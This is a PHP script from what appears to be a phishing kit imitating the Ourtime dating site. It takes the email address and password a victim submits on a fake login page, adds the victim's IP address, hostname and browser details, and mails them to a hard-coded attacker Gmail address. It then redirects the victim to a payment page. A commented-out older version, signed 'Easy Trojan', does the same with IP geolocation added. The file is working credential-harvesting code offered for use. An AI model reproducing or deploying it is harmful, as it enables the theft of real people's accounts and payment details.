<?php

    /*$praga=rand();
	$praga=md5($praga);
	
	$ipAddress = $_SERVER['REMOTE_ADDR']; 
	function systemInfo($ipAddress) {
    $systemInfo = array();

    $ipDetails = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ipAddress), true);
    $systemInfo['city'] = $ipDetails['geoplugin_city'];
    $systemInfo['region'] = $ipDetails['geoplugin_region'];
    $systemInfo['country'] = $ipDetails['geoplugin_countryName'];

    $systemInfo['useragent'] = $_SERVER['HTTP_USER_AGENT'];
    //$systemInfo['os'] = os_info($systemInfo['useragent']);
    //$systemInfo['browser'] = browsername();

    return $systemInfo;
    }
	
	$ip = $_SERVER['REMOTE_ADDR']; 
	$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);


    $message = "";
	$message .= "---|BY Easy Trojan|---\n";
    $message .= "Email: " . $_POST['my_email_address'] . "\n"; 
    $message .= "Password: " . $_POST['my_password'] . "\n"; 
    $message .= "IP : " .$ip. "\n"; 
    $message .= "--------------------------\n";
    $message .=  "City: ".$systemInfo['city']." \n";
    $message .=  "Region: ".$systemInfo['region']."\n";
    $message .=  "Country Name: ".$systemInfo['country']."\n";
    $message .= "--------------------------\n";

	$to ="kimknorthk@gmail.com";

	$subject = "ourtime | $ip";
	$headers = "From: Blessing <blessing@heaven.com>";

	$send = mail($to,$subject,$message,$headers);
	if($send){
		echo "mail sent";
		header("Location: payment.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");  
	}else{
		echo "Error sending mail";	
	} */
	

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message  = "--------------Ourtime Info-----------------------\n";
$message .= "Email            : ".$_POST['my_email_address']."\n";
$message .= "Password           : ".$_POST['my_password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "kimknorthk@gmail.com";
$subject = "unknow 0urtime | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: payment.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");

	
	
	
?>